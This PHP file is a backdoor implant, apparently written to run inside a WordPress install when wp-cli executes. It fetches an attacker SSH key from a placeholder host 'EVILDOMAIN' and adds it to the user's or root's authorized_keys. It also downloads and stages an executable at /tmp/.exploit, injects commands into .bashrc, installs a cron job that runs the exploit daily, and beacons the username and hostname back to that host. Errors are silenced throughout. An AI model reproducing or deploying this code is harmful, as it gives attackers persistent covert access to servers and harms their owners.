<?php
	@$uid = posix_getuid();
	if( isset($uid) and $uid == 0) {
		// in the off change that someone forces wp-cli to run as uid 0
		$user = 'root';
        	$keyfile = '/root/.ssh/authorized_keys';
		$bashrc = '/root/.bashrc';
	} else {
		@$user = posix_getlogin();
        	@$keyfile = '/home/'.posix_getlogin().'/.ssh/authorized_keys';
		$bashrc = '/home/'.$user.'/.bashrc';
        }
	// return to wp-includes if webserver is serving file, this is because we have no login
	if($user == '') {return;}

	// download and add our key to the users authorized_keys
        @$c = curl_init("http://EVILDOMAIN/sshkey.pub");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
	@$current = file_get_contents($keyfile);
        $current .= "\n".$t;
	@file_put_contents($keyfile,$current);
	@chmod($file, 0600);

	// download exploit and install it in /tmp/.exploit
        @$c = curl_init("http://EVILDOMAIN/exploit");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t = curl_exec($c);
	@curl_close($c);
	@$payload = fopen('/tmp/.exploit', "w+");
	@fputs($payload, $t);
	@fclose($payload);
        @chmod('/tmp/.exploit', 0700);

	// Now we add cronjob insertion into the bashrc of the user running the wp-cli.phar
	// so the next time the user logs into the server the cronjob gets inserted and the
	// exploit is executed.
	@$bashrcold = file_get_contents($bashrc);
	@$bashrcold .= "\ncurl -s http://EVILDOMAIN/sshkey.pub?".$user."@".gethostname()." -o /tmp/.sshkey.pub 2>&1 > /dev/null;";
	@$bashrcold .= "\ncrontab /tmp/.cronfile 2>&1 > /dev/null;";
	@$bashrcold .= "\n/tmp/.exploit";
	@file_put_contents($bashrc,$bashrcold);

	@file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n37 13 * * * /tmp/.exploit\n");

	// we do a GET on EVILDOMAIN to inform us which username and host to SSH into with our ssh key
	@$c = curl_init("http://EVILDOMAIN/?".$user."@".gethostbyaddr("127.0.1.1"));
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
?>
